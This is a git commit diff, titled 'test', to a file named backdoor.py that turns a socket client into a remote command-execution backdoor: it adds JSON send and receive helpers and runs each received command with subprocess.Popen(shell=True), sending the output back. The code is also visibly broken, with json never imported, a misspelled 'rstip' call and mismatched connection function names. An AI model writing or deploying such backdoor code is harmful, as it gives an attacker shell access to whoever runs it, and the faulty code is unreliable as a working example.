433a29d9bc5d27cde321e858d9df366f95709dfa
sk0r <97009398+skor21@users.noreply.github.com>
2023-01-06 02:40:10 +0000

    test

--- backdoor.py
+++ backdoor.py
@@ -1,5 +1,19 @@
 import socket
 import time
+import subprocess
+
+def reliable_send(data):
+        jsondata = json.dumps(data)
+        s.send(jsondata.encode())
+
+def reliable_recv():
+        data = ''
+        while True:
+                try:
+                        data = data + s.recv(1024).decode().rstip()
+                        return json.loads(data)
+                except ValueError:
+                        continue
 
 def conection ():
        while True:
@@ -19,8 +33,10 @@ def shell():
                 if command == 'quit' :
                         break
                 else:
-                        #execute the command
-
+                        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        result = execute.stdout.read() + execute.stderr.read()
+                        result = result.decode()
+                        reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
